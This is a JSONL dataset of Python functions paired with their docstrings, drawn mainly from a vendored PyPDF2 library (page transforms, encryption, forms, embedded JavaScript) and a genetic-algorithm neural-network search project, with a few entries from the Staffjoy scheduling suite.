{"docstring": "\"\"\"\nAdd Javascript which will launch upon opening this PDF.\n\n:param str javascript: Your Javascript.\n\n>>> output.addJS(\"this.print({bUI:true,bSilent:false,bShrinkToFit:true});\")\n# Example: This will launch the print window when the PDF is opened.\n\"\"\"\n", "func_signal": "def addJS(self, javascript):\n", "code": "js = DictionaryObject()\njs.update({\n        NameObject(\"/Type\"): NameObject(\"/Action\"),\n        NameObject(\"/S\"): NameObject(\"/JavaScript\"),\n        NameObject(\"/JS\"): NameObject(\"(%s)\" % javascript)\n        })\njs_indirect_object = self._addObject(js)\n\n# We need a name for parameterized javascript in the pdf file, but it can be anything.\njs_string_name = str(uuid.uuid4())\n\njs_name_tree = DictionaryObject()\njs_name_tree.update({\n        NameObject(\"/JavaScript\"): DictionaryObject({\n          NameObject(\"/Names\"): ArrayObject([createStringObject(js_string_name), js_indirect_object])\n        })\n      })\nself._addObject(js_name_tree)\n\nself._root_object.update({\n        NameObject(\"/OpenAction\"): js_indirect_object,\n        NameObject(\"/Names\"): js_name_tree\n        })", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\nThis is similar to mergePage, but the stream to be merged is translated,\nrotated and scaled by appling a transformation matrix.\n\n:param PageObject page2: the page to be merged into this one. Should be\n    an instance of :class:`PageObject<PageObject>`.\n:param float tx: The translation on X axis\n:param float ty: The translation on Y axis\n:param float rotation: The angle of the rotation, in degrees\n:param float scale: The scaling factor\n:param bool expand: Whether the page should be expanded to fit the\n    dimensions of the page to be merged.\n\"\"\"\n", "func_signal": "def mergeRotatedScaledTranslatedPage(self, page2, rotation, scale, tx, ty, expand=False):\n", "code": "translation = [[1, 0, 0],\n               [0, 1, 0],\n               [tx, ty, 1]]\nrotation = math.radians(rotation)\nrotating = [[math.cos(rotation), math.sin(rotation), 0],\n            [-math.sin(rotation), math.cos(rotation), 0],\n            [0,                  0,                  1]]\nscaling = [[scale, 0,    0],\n           [0,    scale, 0],\n           [0,    0,    1]]\nctm = utils.matrixMultiply(rotating, scaling)\nctm = utils.matrixMultiply(ctm, translation)\n\nreturn self.mergeTransformedPage(page2, [ctm[0][0], ctm[0][1],\n                                         ctm[1][0], ctm[1][1],\n                                         ctm[2][0], ctm[2][1]], expand)", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\nGet the page mode.\nSee :meth:`setPageMode()<PdfFileWriter.setPageMode>`\nfor a description of valid modes.\n\n:return: Page mode currently being used.\n:rtype: ``str``, ``None`` if not specified\n\"\"\"\n", "func_signal": "def getPageMode(self):\n", "code": "try:\n    return self.trailer['/Root']['/PageMode']\nexcept KeyError:\n    return None", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "# We move backwards through the xrefs, don't replace any.\n", "func_signal": "def used_before(num, generation):\n", "code": "return num in self.xref.get(generation, []) or \\\n        num in self.xref_objStm", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\nRotates a page counter-clockwise by increments of 90 degrees.\n\n:param int angle: Angle to rotate the page.  Must be an increment\n    of 90 deg.\n\"\"\"\n", "func_signal": "def rotateCounterClockwise(self, angle):\n", "code": "assert angle % 90 == 0\nself._rotate(-angle)\nreturn self", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\nScales a page to the specified dimentions by appling a\ntransformation matrix to its content and updating the page size.\n\n:param float width: The new width.\n:param float height: The new heigth.\n\"\"\"\n", "func_signal": "def scaleTo(self, width, height):\n", "code": "sx = width / float(self.mediaBox.getUpperRight_x() -\n              self.mediaBox.getLowerLeft_x ())\nsy = height / float(self.mediaBox.getUpperRight_y() -\n               self.mediaBox.getLowerLeft_y ())\nself.scale(sx, sy)", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "# 1. Pad or truncate the owner password string as described in step 1 of\n# algorithm 3.2.  If there is no owner password, use the user password\n# instead.\n", "func_signal": "def _alg33_1(password, rev, keylen):\n", "code": "password = b_((password + str_(_encryption_padding))[:32])\n# 2. Initialize the MD5 hash function and pass the result of step 1 as\n# input to this function.\nm = md5(password)\n# 3. (Revision 3 or greater) Do the following 50 times: Take the output\n# from the previous MD5 hash and pass it as input into a new MD5 hash.\nmd5_hash = m.digest()\nif rev >= 3:\n    for i in range(50):\n        md5_hash = md5(md5_hash).digest()\n# 4. Create an RC4 encryption key using the first n bytes of the output\n# from the final MD5 hash, where n is always 5 for revision 2 but, for\n# revision 3 or greater, depends on the value of the encryption\n# dictionary's /Length entry.\nkey = md5_hash[:keylen]\nreturn key", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\nApplies a transformation matrix to the page.\n\n:param tuple ctm: A 6-element tuple containing the operands of the\n    transformation matrix.\n\"\"\"\n", "func_signal": "def addTransformation(self, ctm):\n", "code": "originalContent = self.getContents()\nif originalContent is not None:\n    newContent = PageObject._addTransformationMatrix(\n        originalContent, self.pdf, ctm)\n    newContent = PageObject._pushPopGS(newContent, self.pdf)\n    self[NameObject('/Contents')] = newContent", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "# adds transformation matrix at the beginning of the given\n# contents stream.\n", "func_signal": "def _addTransformationMatrix(contents, pdf, ctm):\n", "code": "a, b, c, d, e, f = ctm\ncontents = ContentStream(contents, pdf)\ncontents.operations.insert(0, [[FloatObject(a), FloatObject(b),\n    FloatObject(c), FloatObject(d), FloatObject(e),\n    FloatObject(f)], \" cm\"])\nreturn contents", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\nRemoves images from this output.\n\n:param bool ignoreByteStringObject: optional parameter\n    to ignore ByteString Objects.\n\"\"\"\n", "func_signal": "def removeImages(self, ignoreByteStringObject=False):\n", "code": "pages = self.getObject(self._pages)['/Kids']\nfor j in range(len(pages)):\n    page = pages[j]\n    pageRef = self.getObject(page)\n    content = pageRef['/Contents'].getObject()\n    if not isinstance(content, ContentStream):\n        content = ContentStream(content, pageRef)\n\n    _operations = []\n    seq_graphics = False\n    for operands, operator in content.operations:\n        if operator == b_('Tj'):\n            text = operands[0]\n            if ignoreByteStringObject:\n                if not isinstance(text, TextStringObject):\n                    operands[0] = TextStringObject()\n        elif operator == b_(\"'\"):\n            text = operands[0]\n            if ignoreByteStringObject:\n                if not isinstance(text, TextStringObject):\n                    operands[0] = TextStringObject()\n        elif operator == b_('\"'):\n            text = operands[2]\n            if ignoreByteStringObject:\n                if not isinstance(text, TextStringObject):\n                    operands[2] = TextStringObject()\n        elif operator == b_(\"TJ\"):\n            for i in range(len(operands[0])):\n                if ignoreByteStringObject:\n                    if not isinstance(operands[0][i], TextStringObject):\n                        operands[0][i] = TextStringObject()\n\n        if operator == b_('q'):\n            seq_graphics = True\n        if operator == b_('Q'):\n            seq_graphics = False\n        if seq_graphics:\n            if operator in [b_('cm'), b_('w'), b_('J'), b_('j'), b_('M'), b_('d'), b_('ri'), b_('i'),\n                    b_('gs'), b_('W'), b_('b'), b_('s'), b_('S'), b_('f'), b_('F'), b_('n'), b_('m'), b_('l'),\n                    b_('c'), b_('v'), b_('y'), b_('h'), b_('B'), b_('Do'), b_('sh')]:\n                continue\n        if operator == b_('re'):\n            continue\n        _operations.append((operands, operator))\n\n    content.operations = _operations\n    pageRef.__setitem__(NameObject('/Contents'), content)", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "# begin reading just after the \"BI\" - begin image\n# first read the dictionary of settings.\n", "func_signal": "def _readInlineImage(self, stream):\n", "code": "settings = DictionaryObject()\nwhile True:\n    tok = readNonWhitespace(stream)\n    stream.seek(-1, 1)\n    if tok == b_(\"I\"):\n        # \"ID\" - begin of image data\n        break\n    key = readObject(stream, self.pdf)\n    tok = readNonWhitespace(stream)\n    stream.seek(-1, 1)\n    value = readObject(stream, self.pdf)\n    settings[key] = value\n# left at beginning of ID\ntmp = stream.read(3)\nassert tmp[:2] == b_(\"ID\")\ndata = b_(\"\")\nwhile True:\n    # Read the inline image, while checking for EI (End Image) operator.\n    tok = stream.read(1)\n    if tok == b_(\"E\"):\n        # Check for End Image\n        tok2 = stream.read(1)\n        if tok2 == b_(\"I\"):\n            # Data can contain EI, so check for the Q operator.\n            tok3 = stream.read(1)\n            info = tok + tok2\n            # We need to find whitespace between EI and Q.\n            has_q_whitespace = False\n            while tok3 in utils.WHITESPACES:\n                has_q_whitespace = True\n                info += tok3\n                tok3 = stream.read(1)\n            if tok3 == b_(\"Q\") and has_q_whitespace:\n                stream.seek(-1, 1)\n                break\n            else:\n                stream.seek(-1,1)\n                data += info\n        else:\n            stream.seek(-1, 1)\n            data += tok\n    else:\n        data += tok\nreturn {\"settings\": settings, \"data\": data}", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\nAdd custom metadata to the output.\n\n:param dict infos: a Python dictionary where each key is a field\n    and each value is your new metadata.\n\"\"\"\n", "func_signal": "def addMetadata(self, infos):\n", "code": "args = {}\nfor key, value in list(infos.items()):\n    args[NameObject(key)] = createStringObject(value)\nself.getObject(self._info).update(args)", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\nExtracts field data if this PDF contains interactive form fields.\nThe *tree* and *retval* parameters are for recursive use.\n\n:param fileobj: A file object (usually a text file) to write\n    a report to on all interactive form fields found.\n:return: A dictionary where each key is a field name, and each\n    value is a :class:`Field<PyPDF2.generic.Field>` object. By\n    default, the mapping name is used for keys.\n:rtype: dict, or ``None`` if form data could not be located.\n\"\"\"\n", "func_signal": "def getFields(self, tree = None, retval = None, fileobj = None):\n", "code": "fieldAttributes = {\"/FT\" : \"Field Type\", \"/Parent\" : \"Parent\",\n               \"/T\" : \"Field Name\", \"/TU\" : \"Alternate Field Name\",\n               \"/TM\" : \"Mapping Name\", \"/Ff\" : \"Field Flags\",\n               \"/V\" : \"Value\", \"/DV\" : \"Default Value\"}\nif retval == None:\n    retval = {}\n    catalog = self.trailer[\"/Root\"]\n    # get the AcroForm tree\n    if \"/AcroForm\" in catalog:\n        tree = catalog[\"/AcroForm\"]\n    else:\n        return None\nif tree == None:\n    return retval\n\nself._checkKids(tree, retval, fileobj)\nfor attr in fieldAttributes:\n    if attr in tree:\n        # Tree is a field\n        self._buildField(tree, retval, fileobj, fieldAttributes)\n        break\n\nif \"/Fields\" in tree:\n    fields = tree[\"/Fields\"]\n    for f in fields:\n        field = f.getObject()\n        self._buildField(field, retval, fileobj, fieldAttributes)\n\nreturn retval", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\nInserts a blank page to this PDF file and returns it. If no page size\nis specified, use the size of the last page.\n\n:param float width: The width of the new page expressed in default user\n    space units.\n:param float height: The height of the new page expressed in default\n    user space units.\n:param int index: Position to add the page.\n:return: the newly appended page\n:rtype: :class:`PageObject<PyPDF2.pdf.PageObject>`\n:raises PageSizeNotDefinedError: if width and height are not defined\n    and previous page does not exist.\n\"\"\"\n", "func_signal": "def insertBlankPage(self, width=None, height=None, index=0):\n", "code": "if width is None or height is None and \\\n        (self.getNumPages() - 1) >= index:\n    oldpage = self.getPage(index)\n    width = oldpage.mediaBox.getWidth()\n    height = oldpage.mediaBox.getHeight()\npage = PageObject.createBlankPage(self, width, height)\nself.insertPage(page, index)\nreturn page", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\nThis is similar to mergePage, but the stream to be merged is translated\nby appling a transformation matrix.\n\n:param PageObject page2: the page to be merged into this one. Should be\n    an instance of :class:`PageObject<PageObject>`.\n:param float tx: The translation on X axis\n:param float ty: The translation on Y axis\n:param bool expand: Whether the page should be expanded to fit the\n    dimensions of the page to be merged.\n\"\"\"\n", "func_signal": "def mergeTranslatedPage(self, page2, tx, ty, expand=False):\n", "code": "return self.mergeTransformedPage(page2, [1,  0,\n                                         0,  1,\n                                         tx, ty], expand)", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"Train each network.\n\nArgs:\n    networks (list): Current population of networks\n    dataset (str): Dataset to use for training/evaluating\n\"\"\"\n", "func_signal": "def train_networks(networks, dataset):\n", "code": "pbar = tqdm(total=len(networks))\nfor network in networks:\n    network.train(dataset)\n    pbar.update(1)\npbar.close()", "path": "main.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Compile a sequential model.\n\nArgs:\n    network (dict): the parameters of the network\n\nReturns:\n    a compiled network.\n\n\"\"\"\n# Get our network parameters.\n", "func_signal": "def compile_model(network, nb_classes, input_shape):\n", "code": "nb_layers = network['nb_layers']\nnb_neurons = network['nb_neurons']\nactivation = network['activation']\noptimizer = network['optimizer']\n\nmodel = Sequential()\n\n# Add each layer.\nfor i in range(nb_layers):\n\n    # Need input shape for first layer.\n    if i == 0:\n        model.add(Dense(nb_neurons, activation=activation, input_shape=input_shape))\n    else:\n        model.add(Dense(nb_neurons, activation=activation))\n\n    model.add(Dropout(0.2))  # hard-coded dropout\n\n# Output layer.\nmodel.add(Dense(nb_classes, activation='softmax'))\n\nmodel.compile(loss='categorical_crossentropy', optimizer=optimizer,\n              metrics=['accuracy'])\n\nreturn model", "path": "train.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Create a population of random networks.\n\nArgs:\n    count (int): Number of networks to generate, aka the\n        size of the population\n\nReturns:\n    (list): Population of network objects\n\n\"\"\"\n", "func_signal": "def create_population(self, count):\n", "code": "pop = []\nfor _ in range(0, count):\n    # Create a random network.\n    network = Network(self.nn_param_choices)\n    network.create_random()\n\n    # Add the network to our population.\n    pop.append(network)\n\nreturn pop", "path": "optimizer.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Train the network and record the accuracy.\n\nArgs:\n    dataset (str): Name of dataset to use.\n\n\"\"\"\n", "func_signal": "def train(self, dataset):\n", "code": "if self.accuracy == 0.:\n    self.accuracy = train_and_score(self.network, dataset)", "path": "network.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Retrieve the CIFAR dataset and process the data.\"\"\"\n# Set defaults.\n", "func_signal": "def get_cifar10():\n", "code": "nb_classes = 10\nbatch_size = 64\ninput_shape = (3072,)\n\n# Get the data.\n(x_train, y_train), (x_test, y_test) = cifar10.load_data()\nx_train = x_train.reshape(50000, 3072)\nx_test = x_test.reshape(10000, 3072)\nx_train = x_train.astype('float32')\nx_test = x_test.astype('float32')\nx_train /= 255\nx_test /= 255\n\n# convert class vectors to binary class matrices\ny_train = to_categorical(y_train, nb_classes)\ny_test = to_categorical(y_test, nb_classes)\n\nreturn (nb_classes, batch_size, input_shape, x_train, x_test, y_train, y_test)", "path": "train.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Print out a network.\"\"\"\n", "func_signal": "def print_network(self):\n", "code": "logging.info(self.network)\nlogging.info(\"Network accuracy: %.2f%%\" % (self.accuracy * 100))", "path": "network.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Print a list of networks.\n\nArgs:\n    networks (list): The population of networks\n\n\"\"\"\n", "func_signal": "def print_networks(networks):\n", "code": "logging.info('-'*80)\nfor network in networks:\n    network.print_network()", "path": "main.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Train each network.\n\nArgs:\n    networks (list): Current population of networks\n    dataset (str): Dataset to use for training/evaluating\n\"\"\"\n", "func_signal": "def train_networks(networks, dataset):\n", "code": "pbar = tqdm(total=len(networks))\nfor network in networks:\n    network.train(dataset)\n    network.print_network()\n    pbar.update(1)\npbar.close()\n\n# Sort our final population.\nnetworks = sorted(networks, key=lambda x: x.accuracy, reverse=True)\n\n# Print out the top 5 networks.\nprint_networks(networks[:5])", "path": "brute.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Generate a network with the genetic algorithm.\n\nArgs:\n    generations (int): Number of times to evole the population\n    population (int): Number of networks in each generation\n    nn_param_choices (dict): Parameter choices for networks\n    dataset (str): Dataset to use for training/evaluating\n\n\"\"\"\n", "func_signal": "def generate(generations, population, nn_param_choices, dataset):\n", "code": "optimizer = Optimizer(nn_param_choices)\nnetworks = optimizer.create_population(population)\n\n# Evolve the generation.\nfor i in range(generations):\n    logging.info(\"***Doing generation %d of %d***\" %\n                 (i + 1, generations))\n\n    # Train and get accuracy for networks.\n    train_networks(networks, dataset)\n\n    # Get the average accuracy for this generation.\n    average_accuracy = get_average_accuracy(networks)\n\n    # Print out the average accuracy each generation.\n    logging.info(\"Generation average: %.2f%%\" % (average_accuracy * 100))\n    logging.info('-'*80)\n\n    # Evolve, except on the last iteration.\n    if i != generations - 1:\n        # Do the evolution.\n        networks = optimizer.evolve(networks)\n\n# Sort our final population.\nnetworks = sorted(networks, key=lambda x: x.accuracy, reverse=True)\n\n# Print out the top 5 networks.\nprint_networks(networks[:5])", "path": "main.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Retrieve the MNIST dataset and process the data.\"\"\"\n# Set defaults.\n", "func_signal": "def get_mnist():\n", "code": "nb_classes = 10\nbatch_size = 128\ninput_shape = (784,)\n\n# Get the data.\n(x_train, y_train), (x_test, y_test) = mnist.load_data()\nx_train = x_train.reshape(60000, 784)\nx_test = x_test.reshape(10000, 784)\nx_train = x_train.astype('float32')\nx_test = x_test.astype('float32')\nx_train /= 255\nx_test /= 255\n\n# convert class vectors to binary class matrices\ny_train = to_categorical(y_train, nb_classes)\ny_test = to_categorical(y_test, nb_classes)\n\nreturn (nb_classes, batch_size, input_shape, x_train, x_test, y_train, y_test)", "path": "train.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Randomly mutate one part of the network.\n\nArgs:\n    network (dict): The network parameters to mutate\n\nReturns:\n    (Network): A randomly mutated network object\n\n\"\"\"\n# Choose a random key.\n", "func_signal": "def mutate(self, network):\n", "code": "mutation = random.choice(list(self.nn_param_choices.keys()))\n\n# Mutate one of the params.\nnetwork.network[mutation] = random.choice(self.nn_param_choices[mutation])\n\nreturn network", "path": "optimizer.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Evolve a population of networks.\n\nArgs:\n    pop (list): A list of network parameters\n\nReturns:\n    (list): The evolved population of networks\n\n\"\"\"\n# Get scores for each network.\n", "func_signal": "def evolve(self, pop):\n", "code": "graded = [(self.fitness(network), network) for network in pop]\n\n# Sort on the scores.\ngraded = [x[1] for x in sorted(graded, key=lambda x: x[0], reverse=True)]\n\n# Get the number we want to keep for the next gen.\nretain_length = int(len(graded)*self.retain)\n\n# The parents are every network we want to keep.\nparents = graded[:retain_length]\n\n# For those we aren't keeping, randomly keep some anyway.\nfor individual in graded[retain_length:]:\n    if self.random_select > random.random():\n        parents.append(individual)\n\n# Now find out how many spots we have left to fill.\nparents_length = len(parents)\ndesired_length = len(pop) - parents_length\nchildren = []\n\n# Add children, which are bred from two remaining networks.\nwhile len(children) < desired_length:\n\n    # Get a random mom and dad.\n    male = random.randint(0, parents_length-1)\n    female = random.randint(0, parents_length-1)\n\n    # Assuming they aren't the same network...\n    if male != female:\n        male = parents[male]\n        female = parents[female]\n\n        # Breed them.\n        babies = self.breed(male, female)\n\n        # Add the children one at a time.\n        for baby in babies:\n            # Don't grow larger than desired length.\n            if len(children) < desired_length:\n                children.append(baby)\n\nparents.extend(children)\n\nreturn parents", "path": "optimizer.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Initialize our network.\n\nArgs:\n    nn_param_choices (dict): Parameters for the network, includes:\n        nb_neurons (list): [64, 128, 256]\n        nb_layers (list): [1, 2, 3, 4]\n        activation (list): ['relu', 'elu']\n        optimizer (list): ['rmsprop', 'adam']\n\"\"\"\n", "func_signal": "def __init__(self, nn_param_choices=None):\n", "code": "self.accuracy = 0.\nself.nn_param_choices = nn_param_choices\nself.network = {}  # (dic): represents MLP network parameters", "path": "network.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Print a list of networks.\n\nArgs:\n    networks (list): The population of networks\n\n\"\"\"\n", "func_signal": "def print_networks(networks):\n", "code": "logging.info('-'*80)\nfor network in networks:\n    network.print_network()", "path": "brute.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Brute force test every network.\"\"\"\n", "func_signal": "def main():\n", "code": "dataset = 'cifar10'\n\nnn_param_choices = {\n    'nb_neurons': [64, 128, 256, 512, 768, 1024],\n    'nb_layers': [1, 2, 3, 4],\n    'activation': ['relu', 'elu', 'tanh', 'sigmoid'],\n    'optimizer': ['rmsprop', 'adam', 'sgd', 'adagrad',\n                  'adadelta', 'adamax', 'nadam'],\n}\n\nlogging.info(\"***Brute forcing networks***\")\n\nnetworks = generate_network_list(nn_param_choices)\n\ntrain_networks(networks, dataset)", "path": "brute.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Make two children as parts of their parents.\n\nArgs:\n    mother (dict): Network parameters\n    father (dict): Network parameters\n\nReturns:\n    (list): Two network objects\n\n\"\"\"\n", "func_signal": "def breed(self, mother, father):\n", "code": "children = []\nfor _ in range(2):\n\n    child = {}\n\n    # Loop through the parameters and pick params for the kid.\n    for param in self.nn_param_choices:\n        child[param] = random.choice(\n            [mother.network[param], father.network[param]]\n        )\n\n    # Now create a network object.\n    network = Network(self.nn_param_choices)\n    network.create_set(child)\n\n    # Randomly mutate some of the children.\n    if self.mutate_chance > random.random():\n        network = self.mutate(network)\n\n    children.append(network)\n\nreturn children", "path": "optimizer.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Train the model, return test loss.\n\nArgs:\n    network (dict): the parameters of the network\n    dataset (str): Dataset to use for training/evaluating\n\n\"\"\"\n", "func_signal": "def train_and_score(network, dataset):\n", "code": "if dataset == 'cifar10':\n    nb_classes, batch_size, input_shape, x_train, \\\n        x_test, y_train, y_test = get_cifar10()\nelif dataset == 'mnist':\n    nb_classes, batch_size, input_shape, x_train, \\\n        x_test, y_train, y_test = get_mnist()\n\nmodel = compile_model(network, nb_classes, input_shape)\n\nmodel.fit(x_train, y_train,\n          batch_size=batch_size,\n          epochs=10000,  # using early stopping, so no real limit\n          verbose=0,\n          validation_data=(x_test, y_test),\n          callbacks=[early_stopper])\n\nscore = model.evaluate(x_test, y_test, verbose=0)\n\nreturn score[1]  # 1 is accuracy. 0 is loss.", "path": "train.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Evolve a network.\"\"\"\n", "func_signal": "def main():\n", "code": "generations = 10  # Number of times to evole the population.\npopulation = 20  # Number of networks in each generation.\ndataset = 'cifar10'\n\nnn_param_choices = {\n    'nb_neurons': [64, 128, 256, 512, 768, 1024],\n    'nb_layers': [1, 2, 3, 4],\n    'activation': ['relu', 'elu', 'tanh', 'sigmoid'],\n    'optimizer': ['rmsprop', 'adam', 'sgd', 'adagrad',\n                  'adadelta', 'adamax', 'nadam'],\n}\n\nlogging.info(\"***Evolving %d generations with population %d***\" %\n             (generations, population))\n\ngenerate(generations, population, nn_param_choices, dataset)", "path": "main.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Generate a list of all possible networks.\n\nArgs:\n    nn_param_choices (dict): The parameter choices\n\nReturns:\n    networks (list): A list of network objects\n\n\"\"\"\n", "func_signal": "def generate_network_list(nn_param_choices):\n", "code": "networks = []\n\n# This is silly.\nfor nbn in nn_param_choices['nb_neurons']:\n    for nbl in nn_param_choices['nb_layers']:\n        for a in nn_param_choices['activation']:\n            for o in nn_param_choices['optimizer']:\n\n                # Set the parameters.\n                network = {\n                    'nb_neurons': nbn,\n                    'nb_layers': nbl,\n                    'activation': a,\n                    'optimizer': o,\n                }\n\n                # Instantiate a network object with set parameters.\n                network_obj = Network()\n                network_obj.create_set(network)\n\n                networks.append(network_obj)\n\nreturn networks", "path": "brute.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "\"\"\"Create a random network.\"\"\"\n", "func_signal": "def create_random(self):\n", "code": "for key in self.nn_param_choices:\n    self.network[key] = random.choice(self.nn_param_choices[key])", "path": "network.py", "repo_name": "harvitronix/neural-network-genetic-algorithm", "stars": 666, "license": "mit", "language": "python", "size": 30}
{"docstring": "# (if you are copying and pasting, update class title below)\n", "func_signal": "def setUp(self):\n", "code": "super(BaseSchedule, self).setUp()\n\ntoday = normalize_to_midnight(datetime.utcnow())\nself.range_start = (today + timedelta(days=7)).isoformat()\nself.range_stop = (today + timedelta(days=14)).isoformat()\n\nself.demand = {\n    \"monday\": [\n        0, 0, 0, 0, 0, 0, 0, 0, 3, 6, 10, 13, 12, 12, 12, 12, 13, 11,\n        8, 6, 4, 2, 0, 0\n    ],\n    \"tuesday\": [\n        0, 0, 0, 0, 0, 0, 0, 0, 2, 6, 9, 9, 9, 10, 12, 13, 13, 11, 7,\n        5, 4, 2, 0, 0\n    ],\n    \"wednesday\": [\n        0, 0, 0, 0, 0, 0, 0, 0, 3, 6, 10, 10, 11, 12, 12, 12, 12, 11,\n        9, 6, 5, 2, 0, 0\n    ],\n    \"thursday\": [\n        0, 0, 0, 0, 0, 0, 0, 0, 3, 6, 7, 11, 11, 11, 9, 9, 10, 9, 5, 3,\n        3, 2, 0, 0\n    ],\n    \"friday\": [\n        0, 0, 0, 0, 0, 0, 0, 0, 2, 2, 7, 9, 9, 10, 12, 12, 12, 8, 7, 5,\n        3, 2, 0, 0\n    ],\n    \"saturday\": [\n        0, 0, 0, 0, 0, 0, 0, 0, 2, 3, 7, 7, 7, 7, 7, 7, 6, 5, 4, 2, 2,\n        1, 0, 0\n    ],\n    \"sunday\": [\n        0, 0, 0, 0, 0, 0, 0, 0, 1, 2, 3, 3, 3, 3, 3, 3, 3, 3, 3, 2, 2,\n        1, 0, 0\n    ]\n}", "path": "tests\\smoke\\organizations\\locations\\roles\\schedules\\base_schedule.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\" View and manage API keys. Use forms for CSRF. \"\"\"\n\n", "func_signal": "def api_key():\n", "code": "plaintext_key = None\nkey_label = None\n\nform = ApiKeyForm()\nif form.validate_on_submit():\n    key_label = form.data.get(\"name\")\n    plaintext_key = ApiKey.generate_key(current_user.id, key_label)\n    flash(\"API Key generated\", \"success\")\n\nreturn render_template(\n    \"api_key.html\",\n    form_title=\"Issue a New API Key\",\n    form=form,\n    key_label=key_label,\n    plaintext_key=plaintext_key)", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
